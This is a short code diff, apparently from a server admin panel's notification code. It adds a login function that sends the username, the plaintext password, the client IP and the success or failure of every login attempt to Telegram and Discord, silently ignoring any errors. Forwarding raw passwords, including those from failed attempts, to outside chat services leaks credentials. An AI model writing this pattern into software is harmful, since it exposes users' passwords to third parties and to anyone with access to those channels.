@@ -154,3 +154,23 @@ def expire_days_reached(db: Session, days: int, user: UserResponse, user_id: int
     create_notification_reminder(
         db, ReminderType.expiration_date, expires_at=dt.utcfromtimestamp(expire),
         user_id=user_id)
+
+def login(username: str, password: str, client_ip: str, is_login: bool) -> None:
+    try:
+        telegram.report_login(
+            username=username,
+            password=password,
+            client_ip=client_ip,
+            is_login="✅ Success" if is_login else "❌ Failed"
+        )
+    except Exception:
+        pass
+    try:
+        discord.report_login(
+            username=username,
+            password=password,
+            client_ip=client_ip,
+            is_login="✅ Success" if is_login else "❌ Failed"
+        )
+    except Exception:
+        pass
